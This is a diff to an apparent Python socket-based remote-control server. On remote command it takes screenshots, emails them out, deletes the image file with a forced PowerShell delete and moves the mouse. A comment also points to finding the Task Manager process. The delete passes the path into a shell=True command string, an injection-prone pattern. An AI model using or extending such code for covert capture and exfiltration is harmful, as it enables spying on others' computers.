@@ -7,7 +7,11 @@ import options
 import signal
 import sys
 from rich import print
+import multiprocessing
 
+# Kill Session Server with Powershell command
+
+#Get-Process | Select-Object Id,ProcessName | findstr Taskmgr
 
 def def_handler(sig, frame):
     print ("\n Saliendo del Programa....")
@@ -83,7 +87,7 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                     email = conexion.recv(1024).decode("utf-8")
                     path_image = option.capture_image(image_name)
                     option.send_image(path_image, email)
-                    remove_image = subprocess.run("powershell rm -Paht {} -Force".format(path_image), shell=True)
+                    remove_image = subprocess.run("powershell rm -Path {} -Force".format(path_image), shell=True)
                     conexion.send(b"Captura Sacada...check email... :)")
                     # Finish code
 
@@ -91,6 +95,7 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                 letter_option = conexion.recv(1024).decode("utf-8")
                 mouse_move(letter_option)
             elif data_client == "exit" or   data_client == "x" or data_client == "3" or data_client == "close":
+                
                 break
             elif data_client == "ihere":
                     conexion.send(b'ihere')
